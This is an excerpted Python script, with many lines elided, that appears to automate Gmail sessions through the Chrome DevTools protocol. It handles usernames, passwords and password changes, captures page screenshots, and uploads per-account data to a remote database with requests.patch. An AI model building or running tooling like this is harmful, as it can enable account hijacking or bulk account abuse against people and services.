...
import re, io,time, random, requests,string,names,subprocess,os,pycountry,phonenumbers,base64,threading
import numpy as np
...
def web(pan):
    ...
    j = {
        ...
        "ba": "history.back()",
        "sc": "html2canvas(document.body).then(canvas => console.log(canvas.toDataURL()))",
    ...
    payload = {
        ...
        "params": {"expression": j.get(kind), "returnByValue": is_get}
    }

    if not payload:
        return {"v": None, "is_get": is_get}
...
def web_gmail(up,username,password,email_gmail_confrim,password_change,ip_address):
    ...
    def connect_ws():
         ...
         ws_url = targets[0]['webSocketDebuggerUrl']  # أول تبويب مفتوح
        ...
        if url_bar is None:
            ...
            for error in totel_erro:
                if error in url_bar:
                    ...
                    requests.patch(f'{link_main}/{up}_android/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
                    break
            break
            ...
            requests.patch(f'{link_main}/{up}_android/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            requests.patch(f'{link_main}/{up}_totel_android/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
